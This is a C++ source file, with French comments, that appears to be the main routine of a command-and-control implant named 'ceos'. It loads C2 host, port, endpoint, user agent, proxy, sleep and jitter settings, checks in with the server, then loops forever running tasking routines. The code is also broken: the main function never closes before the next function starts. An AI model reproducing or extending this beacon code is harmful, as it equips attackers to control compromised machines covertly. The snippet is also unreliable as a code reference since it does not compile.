// ceos.cpp : Ce fichier contient la fonction 'main'. L'exécution du programme commence et se termine à cet endroit.
//

#include "ceos.h"
#include "Config.h"

CONFIG_CEOS* ceosConfig = nullptr;

#define _CRTDBG_MAP_ALLOC
#include <stdlib.h>
#include <crtdbg.h>
#include <iostream>

VOID ceosMain()
{
    ceosConfig = (CONFIG_CEOS*)LocalAlloc(LPTR, sizeof(CONFIG_CEOS));
    // Config Init
    ceosConfig->agentID = (PCHAR)initUUID;
    ceosConfig->hostName = (PWCHAR)hostname;
    ceosConfig->httpPort = port;
    ceosConfig->endPoint = (PWCHAR)endpoint;
    ceosConfig->userAgent = (PWCHAR)useragent;
    ceosConfig->httpMethod = (PWCHAR)httpmethod;
    ceosConfig->isSSL = ssl;
    ceosConfig->isProxyEnabled = proxyenabled;
    ceosConfig->proxyURL = (PWCHAR)proxyurl;
    // Convert the sleeptime from seconds to miliseconds
    ceosConfig->sleeptime_ms = 1000 * sleep_time;
    ceosConfig->jitter = jitter_perc;

    PParser ResponseParser = checkin();
    parseCheckin(ResponseParser);
    while (TRUE)
        routine();

    _CrtSetReportMode(_CRT_WARN, _CRTDBG_MODE_DEBUG); 
    _CrtDumpMemoryLeaks();

VOID setUUID(PCHAR newUUID)
{
    ceosConfig->agentID = newUUID;
    return;
}

